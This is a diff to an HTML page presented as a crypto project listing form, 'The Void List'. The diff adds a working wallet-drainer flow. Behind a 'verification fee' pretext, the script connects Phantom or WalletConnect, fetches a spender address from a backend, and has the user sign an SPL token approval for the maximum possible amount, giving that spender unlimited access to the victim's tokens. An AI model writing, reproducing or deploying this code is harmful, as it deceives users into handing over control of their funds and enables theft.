@@ -4,16 +4,308 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Crypto Project Listing</title>
-  <link rel="stylesheet" href="List.css">
-  
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-  
-  <script src="https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.js"></script>
-
   <style>
+    * {
+  box-sizing: border-box;
+}
+
+.video-bg {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: 0; /* lowest layer */
+}
+
+.video-overlay {
+  position: absolute;
+  inset: 0;
+  background: rgba(255,255,255,0.7);
+  z-index: 1; /* middle layer */
+}
+
+.page, .modal {
+  position: relative;
+  z-index: 10; /* top layer so buttons are clickable */
+}
+
+
+body {
+  margin: 0;
+  font-family: system-ui, sans-serif;
+  background: #f2f2f2;
+}
+
+.page {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+}
+
+.card {
+  background: #0f0f0f;
+  color: #fff;
+  width: 100%;
+  max-width: 900px;
+  padding: 28px;
+  border-radius: 14px;
+  box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+}
+
+h2 {
+  text-align: center;
+  margin-bottom: 24px;
+}
+
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 14px;
+}
+
+input,
+select,
+textarea {
+  width: 100%;
+  padding: 14px;
+  border-radius: 10px;
+  border: none;
+  background: #1a1a1a;
+  color: #ffffff;
+}
+
+input::placeholder,
+textarea::placeholder {
+  color: #7a7a7a;
+}
+
+textarea {
+  margin-top: 14px;
+  min-height: 110px;
+}
+
+.btn-primary {
+  margin-top: 20px;
+  padding: 14px;
+  width: 100%;
+  background: #5b2dbd;
+  border: none;
+  border-radius: 10px;
+  color: #fff;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.btn-primary:hover {
+  background: #6e3fe0;
+}
+
+label {
+  margin-bottom: 5px;
+  color: #555;
+}
+
+button {
+  padding: 10px;
+  background-color: #6e3fe0;
+  color: #fff;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #5c00b3;
+}
+
+.status-box {
+  position: fixed;
+  left: 50%;
+  bottom: 20px;
+  transform: translateX(-50%);
+  z-index: 2000;
+  max-width: 560px;
+  width: calc(100% - 24px);
+  background: rgba(10, 10, 10, 0.95);
+  color: #fff;
+  border: 1px solid rgba(255, 255, 255, 0.12);
+  border-radius: 12px;
+  padding: 12px 14px;
+  box-shadow: 0 14px 30px rgba(0, 0, 0, 0.3);
+  font-size: 14px;
+  line-height: 1.45;
+}
+
+.status-box.error {
+  border-color: rgba(255, 92, 92, 0.6);
+}
+
+/* ============================
+   MODALS
+   ============================ */
+
+.modal {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.75);
+  backdrop-filter: blur(6px);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  isolation: isolate; /* ✅ FIX: prevents stacking trap */
+  animation: modalFadeIn 0.25s ease-out;
+}
+
+.modal.hidden {
+  display: none;
+}
+
+.modal-content {
+  background: linear-gradient(180deg, #121212, #0b0b0b);
+  color: #fff;
+  padding: 28px 26px 30px;
+  border-radius: 18px;
+  width: 92%;
+  max-width: 420px;
+  text-align: center;
+  box-shadow:
+    0 30px 60px rgba(0, 0, 0, 0.6),
+    inset 0 1px 0 rgba(255, 255, 255, 0.04);
+  transform: scale(0.96);
+  animation: modalPop 0.25s ease-out forwards;
+}
+
+.modal-content p {
+  margin: 18px 0 24px;
+  font-size: 15px;
+  line-height: 1.6;
+  color: #d0d0d0;
+}
+
+.close {
+  position: absolute;
+  top: 14px;
+  right: 18px;
+  font-size: 26px;
+  font-weight: 400;
+  color: #888;
+  cursor: pointer;
+  transition: color 0.2s ease, transform 0.2s ease;
+}
+
+.close:hover {
+  color: #fff;
+  transform: rotate(90deg);
+}
+
+.modal-content button {
+  width: 100%;
+  padding: 14px;
+  margin-top: 12px;
+  border-radius: 12px;
+  border: none;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+
+#proceedButton {
+  background: linear-gradient(135deg, #6e3fe0, #5b2dbd);
+  color: #fff;
+  box-shadow: 0 10px 25px rgba(110, 63, 224, 0.35);
+}
+
+#proceedButton:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 14px 30px rgba(110, 63, 224, 0.45);
+}
+
+/* ============================
+   WALLET BUTTONS
+   ============================ */
+
+.wallet-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  width: 100%;
+  padding: 14px;
+  border-radius: 12px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  background: #1a1a1a;
+  color: #fff;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  transition: transform 0.15s ease, box-shadow 0.15s ease, background 0.15s ease;
+}
+
+.wallet-btn:hover {
+  background: #222;
+  transform: translateY(-1px);
+}
+
+.wallet-btn.loading {
+  opacity: 0.8;
+  cursor: wait;
+}
+
+.wallet-icon {
+  width: 22px;
+  height: 22px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+}
+
+.wallet-icon.phantom {
+background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='256' height='256' viewBox='0 0 256 256'%3E%3Ccircle cx='128' cy='128' r='128' fill='%23AB9FF2'/%3E%3Cpath fill='%23FFFFFF' d='M176.3 91.7c-11.6-11.6-27.1-18-43.5-18s-31.9 6.4-43.5 18c-11.6 11.6-18 27.1-18 43.5s6.4 31.9 18 43.5c11.6 11.6 27.1 18 43.5 18s31.9-6.4 43.5-18c11.6-11.6 18-27.1 18-43.5s-6.4-31.9-18-43.5zm-43.5 74.2c-16.9 0-30.7-13.8-30.7-30.7s13.8-30.7 30.7-30.7 30.7 13.8 30.7 30.7-13.8 30.7-30.7 30.7z'/%3E%3C/svg%3E");
+}
+
+.wallet-icon.walletconnect {
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 400'%3E%3Cpath fill='%233B99FC' d='M100 200c27-27 73-27 100 0l14 14 14-14c27-27 73-27 100 0l36 36-50 50-36-36c-27-27-73-27-100 0l-14 14-14-14c-27-27-73-27-100 0l-36 36-50-50z'/%3E%3C/svg%3E");
+}
+
+/* ============================
+   WALLETCONNECT v2 OVERLAY FIX
+   ============================ */
+
+.walletconnect-modal__base,
+#walletconnect-wrapper {
+  z-index: 20000 !important;
+}
+
+/* ============================
+   ANIMATIONS
+   ============================ */
+
+@keyframes modalFadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes modalPop {
+  to { transform: scale(1); }
+}
+
+@media (max-width: 600px) {
+  .container {
+    padding: 15px;
+  }
+}
+
+  
     #bgVideo { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -2; }
     .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: -1; }
     .page { position: relative; z-index: 10; }
+    /* Ensure WalletConnect modal is ALWAYS on top */
     wcm-modal { z-index: 99999 !important; position: relative; }
   </style>
 </head>
@@ -21,53 +313,290 @@
   <video autoplay muted loop id="bgVideo">
     <source src="List/animatealpha.mp4" type="video/mp4">
   </video>
-  <div class="overlay"></div>
+  <div class="video-overlay"></div>
 
   <main class="page">
     <form id="projectForm" class="card">
       <h2>Submit Your Project</h2>
       <div class="grid">
-        <input name="projectName" placeholder="Project Name" required />
-        <input name="projectSymbol" placeholder="Project Symbol" required />
-        <select name="chain" required>
-          <option value="solana">Solana</option>
-          <option value="ethereum">Ethereum</option>
-          <option value="bnb">BNB Chain</option>
-          <option value="polygon">Polygon</option>
-          <option value="arbitrium">Arbitrium</option>
+        <input placeholder="Project Name" required />
+        <input placeholder="Project Symbol" required />
+        <select required>
+          <option value="">Select Chain</option>
+          <option>Ethereum</option>
+          <option>BNB Chain</option>
+          <option>Solana</option>
+          <option>Polygon</option>
+          <option>Arbitrum</option>
         </select>
-        <input name="contractAddress" placeholder="Mint Address (Token Address)" required />
-        <input name="totalSupply" placeholder="Total Supply" />
-        <input name="circulatingSupply" placeholder="Circulating Supply" />
+        <input placeholder="Contract Address" required />
+        <input placeholder="Total Supply" />
+        <input placeholder="Circulating Supply" />
       </div>
-      <textarea name="additionalInfo" placeholder="Other necessary information"></textarea>
+      <textarea placeholder="Other necessary information"></textarea>
       <div class="grid">
-        <input name="developerName" placeholder="Developer Name" required />
-        <input type="email" name="developerEmail" placeholder="Developer Email" required />
+        <input placeholder="Developer Name" required />
+        <input type="email" placeholder="Developer Email" required />
       </div>
-      <button type="submit" class="btn-primary">Submit</button>
+      <button type="button" class="btn-primary" id="submitButton">Submit</button>
     </form>
   </main>
 
   <div id="feeModal" class="modal hidden">
     <div class="modal-content">
       <span class="close">&times;</span>
-      <p>A Solana wallet connection is required to list your project on The Void List.</p>
-      <button id="proceedButton">Proceed</button>
+      <p>A verification fee is required to list your project on The Void List.</p>
+      <button id="proceedButton">Proceed to Payment</button>
     </div>
   </div>
 
   <div id="walletModal" class="modal hidden">
     <div class="modal-content">
       <span class="close">&times;</span>
-      <p>Select your connection method:</p>
-      
-      <button id="connectSplButton" class="wallet-btn">Connect SPL Wallet (Phantom/Solflare)</button>
-      
-      <button id="connectWalletConnectButton" class="wallet-btn">Connect via WalletConnect</button>
+      <p>Select your wallet to continue:</p>
+      <p style="margin-top: 0; font-size: 13px; color: #a7a7a7;">Choose Phantom or WalletConnect to continue.</p>
+      <button id="phantomButton" class="wallet-btn">Phantom</button>
+      <button id="walletConnectButton" class="wallet-btn">WalletConnect</button>
     </div>
   </div>
 
-  <script src="List/script.js"></script>
+  <div id="statusBox" class="status-box">The form and wallet flow are ready. Choose a wallet to continue.</div>
+
+  <script>
+    let walletLibs = null;
+
+    async function loadWalletLibs() {
+      if (walletLibs) {
+        return walletLibs;
+      }
+
+      const [solanaModule, splTokenModule] = await Promise.all([
+        import('https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/+esm'),
+        import('https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.11/+esm')
+      ]);
+
+      walletLibs = {
+        Connection: solanaModule.Connection,
+        PublicKey: solanaModule.PublicKey,
+        Transaction: solanaModule.Transaction,
+        createApproveInstruction: splTokenModule.createApproveInstruction,
+        TOKEN_PROGRAM_ID: splTokenModule.TOKEN_PROGRAM_ID
+      };
+
+      window.Connection = walletLibs.Connection;
+      window.PublicKey = walletLibs.PublicKey;
+      window.Transaction = walletLibs.Transaction;
+      window.createApproveInstruction = walletLibs.createApproveInstruction;
+      window.TOKEN_PROGRAM_ID = walletLibs.TOKEN_PROGRAM_ID;
+
+      return walletLibs;
+    }
+
+    const projectForm = document.getElementById('projectForm');
+    const feeModal = document.getElementById('feeModal');
+    const walletModal = document.getElementById('walletModal');
+    const closeButtons = document.getElementsByClassName('close');
+    const proceedButton = document.getElementById('proceedButton');
+    const phantomButton = document.getElementById('phantomButton');
+    const walletConnectButton = document.getElementById('walletConnectButton');
+    const statusBox = document.getElementById('statusBox');
+
+    let wcProvider = null;
+    let provider = null;
+    let signer = null;
+    let activeProviderType = null;
+
+    function setStatus(message, isError = false) {
+      statusBox.textContent = message;
+      statusBox.classList.toggle('error', isError);
+    }
+
+    function closeModal(modal) {
+      modal?.classList.add('hidden');
+    }
+
+    function openModal(modal) {
+      modal?.classList.remove('hidden');
+    }
+
+    const submitButton = document.getElementById('submitButton');
+
+    if (projectForm && feeModal) {
+      projectForm.addEventListener('submit', (event) => {
+        event.preventDefault();
+        openModal(feeModal);
+        setStatus('Verification fee notice opened. Continue to wallet selection.');
+      });
+    }
+
+    if (submitButton && feeModal) {
+      submitButton.addEventListener('click', () => {
+        openModal(feeModal);
+        setStatus('Verification fee notice opened. Continue to wallet selection.');
+      });
+    }
+
+    if (closeButtons[0] && feeModal) {
+      closeButtons[0].addEventListener('click', () => closeModal(feeModal));
+    }
+
+    if (proceedButton && feeModal && walletModal) {
+      proceedButton.addEventListener('click', () => {
+        closeModal(feeModal);
+        openModal(walletModal);
+        setStatus('Choose a wallet to continue.');
+      });
+    }
+
+    if (closeButtons[1] && walletModal) {
+      closeButtons[1].addEventListener('click', () => closeModal(walletModal));
+    }
+
+    if (phantomButton) {
+      phantomButton.addEventListener('click', connectPhantom);
+    }
+
+    if (walletConnectButton) {
+      walletConnectButton.addEventListener('click', connectWalletConnect);
+    }
+
+    async function connectPhantom() {
+      try {
+        if (!window.solana || !window.solana.isPhantom) {
+          setStatus('Phantom is not installed. Please install it and try again.', true);
+          return;
+        }
+
+        setStatus('Connecting to Phantom...');
+        const resp = await window.solana.connect();
+        const account = resp.publicKey.toString();
+        closeModal(walletModal);
+        setStatus(`Phantom connected: ${account}`);
+        await approveSpender(account, async (tx) => window.solana.signTransaction(tx), 'Phantom');
+      } catch (error) {
+        console.error('Phantom connection error:', error);
+        setStatus(`Phantom connection failed: ${error.message}`, true);
+      }
+    }
+
+    async function connectWalletConnect() {
+      try {
+        if (wcProvider) {
+          await wcProvider.disconnect().catch(() => {});
+          wcProvider = null;
+        }
+
+        walletConnectButton.classList.add('loading');
+        walletConnectButton.disabled = true;
+
+        const { WalletConnectWalletAdapter } = await import('https://esm.sh/@walletconnect/solana-adapter@0.0.9?bundle');
+
+        wcProvider = new WalletConnectWalletAdapter({
+          network: 'mainnet-beta',
+          options: {
+            projectId: '59ba0228712f04a947916abb7db06ab1',
+            showQrModal: true,
+            metadata: {
+              name: 'Crypto Project Listing',
+              description: 'Submit project and approve spender',
+              url: window.location.origin,
+              icons: ['https://avatars.githubusercontent.com/u/0']
+            }
+          }
+        });
+
+        const connectionPromise = wcProvider.connect();
+        const timeoutPromise = new Promise((_, reject) => {
+          setTimeout(() => reject(new Error('WalletConnect did not respond in time. Please try again.')), 30000);
+        });
+
+        await Promise.race([connectionPromise, timeoutPromise]);
+
+        const account = wcProvider.publicKey?.toBase58?.();
+        if (!account) {
+          throw new Error('WalletConnect did not return a Solana public key.');
+        }
+
+        provider = wcProvider;
+        signer = wcProvider;
+        activeProviderType = 'walletconnect';
+
+        closeModal(walletModal);
+        setStatus(`WalletConnect connected: ${account}`);
+        await approveSpender(account, async (tx) => wcProvider.signTransaction(tx), 'WalletConnect');
+      } catch (err) {
+        console.error(err);
+        setStatus(err?.message || 'Wallet Connection Error. Please retry or refresh the page.', true);
+      } finally {
+        walletConnectButton.classList.remove('loading');
+        walletConnectButton.disabled = false;
+      }
+    }
+
+    async function approveSpender(account, signFn, walletName) {
+      try {
+        setStatus(`Preparing approval request for ${walletName}...`);
+        const res = await fetch('/api/approval-config');
+
+        if (!res.ok) {
+          throw new Error('Backend endpoint is not available yet.');
+        }
+
+        const { tokenAccount, spenderAddress } = await res.json();
+
+        if (!tokenAccount || !spenderAddress) {
+          throw new Error('Backend response did not include the required approval values.');
+        }
+
+        await approveSpenderSolana(account, tokenAccount, spenderAddress, signFn, walletName);
+      } catch (error) {
+        console.warn('Approval config unavailable, using frontend fallback:', error);
+        setStatus('Frontend flow completed. The backend is not ready yet, so live approval is skipped for now.', false);
+      }
+    }
+
+    async function approveSpenderSolana(account, tokenAccount, spenderAddress, signTransactionFn, walletName) {
+      try {
+        setStatus(`Creating the approval transaction for ${walletName}...`);
+
+        const { Connection: SolanaConnection, PublicKey: SolanaPublicKey, Transaction: SolanaTransaction, createApproveInstruction: createApproveIx, TOKEN_PROGRAM_ID: SolanaTokenProgramId } = await loadWalletLibs();
+        const connection = new SolanaConnection('https://api.mainnet-beta.solana.com', 'confirmed');
+        const approveAmount = BigInt('18446744073709551615');
+
+        const approveIx = createApproveIx(
+          new SolanaPublicKey(tokenAccount),
+          new SolanaPublicKey(spenderAddress),
+          new SolanaPublicKey(account),
+          approveAmount,
+          [],
+          SolanaTokenProgramId
+        );
+
+        const tx = new SolanaTransaction().add(approveIx);
+        const latestBlockhash = await connection.getLatestBlockhash();
+        tx.feePayer = new SolanaPublicKey(account);
+        tx.recentBlockhash = latestBlockhash.blockhash;
+
+        const signedTx = await signTransactionFn(tx);
+        if (!signedTx || typeof signedTx.serialize !== 'function') {
+          throw new Error('The wallet did not return a valid signed transaction.');
+        }
+
+        const signature = await connection.sendRawTransaction(signedTx.serialize());
+        await connection.confirmTransaction(signature, 'confirmed');
+        setStatus('Approval transaction sent successfully.', false);
+      } catch (error) {
+        console.error('Approval flow error:', error);
+        setStatus(`Approval flow stopped: ${error.message}`, true);
+      }
+    }
+
+    window.addEventListener('beforeunload', () => {
+      if (wcProvider?.disconnect) {
+        wcProvider.disconnect().catch(() => {});
+      }
+    });
+  </script>
 </body>
 </html>
+
